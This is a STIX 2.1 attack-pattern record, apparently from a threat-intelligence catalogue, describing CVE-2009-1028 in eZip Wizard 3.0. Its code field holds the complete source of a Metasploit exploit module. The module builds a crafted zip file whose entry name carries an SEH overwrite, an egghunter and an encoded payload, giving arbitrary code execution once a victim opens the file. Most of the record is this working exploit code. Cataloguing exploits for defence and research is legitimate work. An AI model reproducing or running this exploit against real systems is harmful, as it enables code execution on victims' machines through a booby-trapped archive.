{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4433d865-4e8e-411e-aaba-971eba9bb8bc",
    "created": "2024-08-14T16:35:42.480066Z",
    "modified": "2024-08-14T16:35:42.48007Z",
    "name": "eZip Wizard 3.0 Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in version 3.0 of ediSys Corp.'s eZip Wizard.  In order for the command to be executed, an attacker must convince someone to open a specially crafted zip file with eZip Wizard, and access the specially file via double-clicking it. By doing so, an attacker can execute arbitrary code as the victim user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ezip_wizard_bof.rb",
            "external_id": "ezip_wizard_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1028"
        },
        {
            "source_name": "reference",
            "url": "http://www.edisys.com/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'eZip Wizard 3.0 Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability in\n        version 3.0 of ediSys Corp.'s eZip Wizard.\n\n        In order for the command to be executed, an attacker must convince someone to\n        open a specially crafted zip file with eZip Wizard, and access the specially\n        file via double-clicking it. By doing so, an attacker can execute arbitrary\n        code as the victim user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'fl0 fl0w',  #Initial discovery, poc\n          'jduck',     #Metasploit\n          'Lincoln',   #Complete Metasploit port\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-1028' ],\n          [ 'OSVDB', '52815' ],\n          [ 'BID', '34044' ],\n          [ 'URL', 'http://www.edisys.com/' ],\n          [ 'EDB', '8180' ],\n          [ 'EDB', '12059' ],\n        ],\n      'Platform'          => [ 'win' ],\n      'Payload'           =>\n        {\n          'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,\n        },\n      'DefaultOptions' =>\n        {\n          'AllowWin32SEH' => true\n        },\n      'Targets'        =>\n        [\n          ['Windows Universal', { 'Offset' => 58, 'Ret' => 0x10020710 }],\n        ],\n      'DisclosureDate' => '2009-03-09',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']),\n        OptString.new('USERNAME', [ true, 'Username', ''])\n      ])\n\n  end\n\n  def exploit\n\n    #These badchars do not apply to the final payload\n    badchars = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0d\\x2F\\x5c\\x3c\\x3e\\x5e\\x7e\"\n\n    eggoptions =\n    {\n        :checksum => true,\n        :eggtag => 'w00t'\n    }\n\n    hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)\n\n    [ 'x86/alpha_mixed'].each { |name|\n      enc = framework.encoders.create(name)\n      if name =~/alpha/\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'ESP' })\n      end\n      hunter = enc.encode(hunter, nil, nil, platform)\n    }\n\n    #Username length affects our offset to hit SEH correctly\n    if datastore['USERNAME'].length >= 9\n      padding = rand_text_alpha(target['Offset'] - 8)\n    else\n      padding = rand_text_alpha(target['Offset'] - datastore['USERNAME'].length)\n    end\n\n    fname  = padding\n    fname << \"\\x61\\x61\\x7a\\x04\"      #nseh, align + conditional jmp\n    fname << [target.ret].pack('V')  #seh\n    fname << \"\\x61\" * 29             #align for hunter\n    fname << \"\\x58\\x58\\x41\"          #align for hunter\n    fname << hunter\n    fname << egg\n\n    zip = Rex::Zip::Archive.new\n    xtra = [0xdac0ffee].pack('V')\n    comment = [0xbadc0ded].pack('V')\n    zip.add_file(fname, xtra, comment)\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(zip.pack)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-09",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}